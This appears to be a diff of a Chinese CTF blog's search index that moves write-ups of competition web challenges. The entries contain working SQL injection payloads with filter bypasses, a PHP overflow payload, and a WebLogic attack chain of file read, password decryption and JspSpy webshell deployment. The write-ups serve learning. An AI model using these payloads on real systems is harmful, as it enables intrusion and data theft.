+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">查库名</span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>group_concat(db),<span class="number">2</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>sys.schema_object_overview#</span><br><span class="line"></span><br><span class="line">查表名</span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span>admin<span class="string">&#x27;/**/union/**/select/**/group_concat(table_name),2/**/from/**/sys.schema_table_statistics/**/where/**/table_schema=&#x27;</span>flagisHere<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">无列名注入</span></span><br><span class="line"><span class="string">username=admin&amp;passwd=admin&#x27;</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span>group_concat(a)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>a<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="operator">*</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flagisHere.flAg</span><br></pre></td></tr></table></figure>
+
+<h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>按照wp的反弹shell没打通</p>
+<h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p>这个题学到的挺多的</p>
+<p>先通过任意文件读取漏洞获得密钥和密文</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;config&#x2F;config.xml</span><br><span class="line">.&#x2F;security&#x2F;SerializedSystemIni.dat</span><br></pre></td></tr></table></figure>
+
+<p>然后用这个<a href="https://github.com/TideSec/Decrypt_Weblogic_Password">https://github.com/TideSec/Decrypt_Weblogic_Password</a>文章中提到的，获得密码，登入后台，部署木马。</p>
+<p>war木马，就是将jsp木马压缩成zip，然后改后缀就行，这里把war部署到服务器上。</p>
+<p>访问大马文件<a href="http://host/test/JspSpy.jsp">http://host/test/JspSpy.jsp</a></p>
+<p>找到个flag.tar，结果我解压的时候给破坏了，现在服务器里没flag了，它这个是所有人一个环境，后面复现的人得多少有点懵逼，所以：</p>
+<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20211013215350.png"></p>
+<p>我在根目录里面创建了个假的flag（哈哈哈，逃</p>
+]]></content>
+      <categories>
+        <category>ctf学习</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>文件上传总结</title>
     <url>/posts/ea42f6a6/</url>
     <content><![CDATA[<h2 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h2><ol>
@@ -2437,66 +2497,6 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       <tags>
         <tag>web</tag>
         <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>初夏赛复盘</title>
-    <url>/posts/63fc7f18/</url>
-    <content><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="sql-inject"><a href="#sql-inject" class="headerlink" title="sql_inject"></a>sql_inject</h2><blockquote>
-<p>过滤绕过</p>
-</blockquote>
-<p>|| 代替 or</p>
-<p>!(a&lt;&gt;a) 代替 =</p>
-<p>/**/ 代替 空格</p>
-<p>mid 代替 left right substr</p>
-<p>3’/<strong>/||/</strong>/!(1&lt;&gt;1)#</p>
-<p>3’/<strong>/||/</strong>/!(database()&lt;&gt;’cumtctf’)#</p>
-<p>1’/<strong>/||/</strong>/!(mid((select/<strong>/group_concat(table_name)/</strong>/from/<strong>/mysql.innodb_table_stats/</strong>/where/**/!(database_name&lt;&gt;’cumtctf’)),1,1)&lt;&gt;’f’)#;</p>
-<p>1’/<strong>/||/</strong>/!(mid((select/<strong>/group_concat(table_name)/</strong>/from/<strong>/mysql.innodb_table_stats/</strong>/where/**/!(database_name&lt;&gt;’cumtctf’)),1,34)&lt;&gt;’flag_table,no_use_table,test,users’)#;</p>
-<p>无列名注入这个有点离谱<br>直接把flag给试出来了？？？</p>
-<p>1’/<strong>/||/</strong>/(select/<strong>/(‘flag{cumtctf_sql_is_s0_e@sy}’,0)&gt;(select/</strong>/*/<strong>/from/</strong>/flag_table/<strong>/limit/</strong>/1,1));#</p>
-<h2 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h2><p>php在64位系统中，当索引大小为9223372036854775808会溢出</p>
-<pre><code>payload:web=flag&amp;a[]=1&amp;b[]=2&amp;c=9223372036854775806
-</code></pre>
-<p>jphide:</p>
-<p>这个有GUI界面不用命令输入密码就行。</p>
-<h2 id="RCE-Me"><a href="#RCE-Me" class="headerlink" title="RCE_Me"></a>RCE_Me</h2>]]></content>
-      <categories>
-        <category>ctf学习</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>sql注入</tag>
-        <tag>代码审计</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>国庆赛部分赛题复现</title>
-    <url>/posts/bfdb9200/</url>
-    <content><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="sql2"><a href="#sql2" class="headerlink" title="sql2"></a>sql2</h3><blockquote>
-<p>环境有点问题，复现一半出不来了</p>
-</blockquote>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">查库名</span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>group_concat(db),<span class="number">2</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>sys.schema_object_overview#</span><br><span class="line"></span><br><span class="line">查表名</span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span>admin<span class="string">&#x27;/**/union/**/select/**/group_concat(table_name),2/**/from/**/sys.schema_table_statistics/**/where/**/table_schema=&#x27;</span>flagisHere<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">无列名注入</span></span><br><span class="line"><span class="string">username=admin&amp;passwd=admin&#x27;</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span>group_concat(a)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>a<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="operator">*</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flagisHere.flAg</span><br></pre></td></tr></table></figure>
-
-<h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>按照wp的反弹shell没打通</p>
-<h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p>这个题学到的挺多的</p>
-<p>先通过任意文件读取漏洞获得密钥和密文</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;config&#x2F;config.xml</span><br><span class="line">.&#x2F;security&#x2F;SerializedSystemIni.dat</span><br></pre></td></tr></table></figure>
-
-<p>然后用这个<a href="https://github.com/TideSec/Decrypt_Weblogic_Password">https://github.com/TideSec/Decrypt_Weblogic_Password</a>文章中提到的，获得密码，登入后台，部署木马。</p>
-<p>war木马，就是将jsp木马压缩成zip，然后改后缀就行，这里把war部署到服务器上。</p>
-<p>访问大马文件<a href="http://host/test/JspSpy.jsp">http://host/test/JspSpy.jsp</a></p>
-<p>找到个flag.tar，结果我解压的时候给破坏了，现在服务器里没flag了，它这个是所有人一个环境，后面复现的人得多少有点懵逼，所以：</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20211013215350.png"></p>
-<p>我在根目录里面创建了个假的flag（哈哈哈，逃</p>
-]]></content>
-      <categories>
-        <category>ctf学习</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>sql注入</tag>
       </tags>
   </entry>
   <entry>
@@ -2630,7 +2630,7 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
 <p align="center">
     <br/>
     <a href="https://github.com/ziishaned/learn-regex">
-        <img src="https://i.imgur.com/bYwl7Vf.png" alt="Learn Regex">
+        <img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/202202091610173.png" alt="Learn Regex">
     </a>
 </p>
 
